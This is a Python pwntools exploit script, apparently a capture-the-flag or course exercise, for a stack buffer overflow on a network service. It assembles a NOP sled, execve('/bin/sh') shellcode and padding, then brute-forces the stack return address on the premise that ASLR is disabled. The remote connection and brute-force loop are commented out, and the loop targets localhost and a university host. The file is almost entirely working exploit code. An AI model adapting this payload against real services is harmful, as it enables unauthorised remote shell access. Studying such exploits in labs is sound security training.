from pwn import *

context.log_level = "error"
context.arch = 'amd64'
context.os = 'linux'

# The shellcode reaches height of 6 QWORDS (6*8=48 Bytes) after the return address if popped of the stack. We can see this:
# So, we need to be careful inorder to not override our shell code with stack push instructions, when our shellcode is called.
# 1 # push 0x68
    # mov rax, 0x732f2f2f6e69622f
# 2 # push rax
    # mov rdi, rsp
# 3 # push 0x1010101 ^ 0x6873
    # xor dword ptr [rsp], 0x1010101
    # xor esi, esi /* 0 */
# 4 # push rsi /* null terminate */
# 5 # push 8
# 4 # pop rsi
    # add rsi, rsp
# 5 # push rsi /* 'sh\x00' */
    # mov rsi, rsp
    # xor edx, edx /* 0 */
# 6 # push SYS_execve /* 0x3b */
# 5 # pop rax
    # syscall

# So, we need to leave 48 bytes for stack push instructions after our shell code.
# We call this the padding or the junk data that will be overwritten when our shellcode is called:
padding = 48
# Our shell code length is 48, can be found by len(shellcode)
shellcode = asm(shellcraft.sh())
# The offset between our input buffer and saved RIP is 136, found by local analysis
offset = 136 
# Now, we can calculate, how much nop slides (nop sleds) we can use in our exploit:
nopsled = offset - len(shellcode) - padding
# Since, we can reuse the address saved rip after it has be popped off the stack (means our shellcode has been called), we add it:
nopsled += 8    # Because address in x86_64 is QWord (4 Words (1W=2B) or 8 bytes or 64 bits or) 

print(nopsled)

# Now we have the pieces to craft our payload (except the target address of buffer which we will bruteforce)
payload = asm('nop') * nopsled
payload += shellcode
payload += b"X" * padding 

print(len(payload))

# Now to bruteforce the address of input buffer, we use the memory mapping obtained from the local binary. We can use it because
# ASLR (PIE) is disabled. We can get this in gdb when program is running using: (gdb) info proc map
# Start Addr         End Addr           Size               Offset             Perms File
# 0x00007ffffffde000 0x00007ffffffff000 0x21000            0x0                rwxp  [stack]

# Since stack grows from higher to lower address, so we start from higher add and move to lower in our brute force
start = 0x00007ffffffff000
end = 0x00007ffffffde000
# Instead brutefocingg address byte by byte, we can use a step of 48 (size of nopsled) 
# since it's already aligned to 16 (before function call)
step = nopsled  # 48

# for base_addr in range(start, end, -step):
#     target = base_addr - (offset + 8)
#     payload += p64(target)

#     p = remote('127.0.0.1', 4405)
#     p.sendline(payload)

#     check = b"echo PWNED1337"
#     p.sendline(check)

#     if p.recvline() == b"PWNED1337":
#         print(f"Target address: {target}")
#         p.interactive()
#         break



# # p = remote('lettieri.iet.unipi.it', 4405)

# p.sendline(payload)

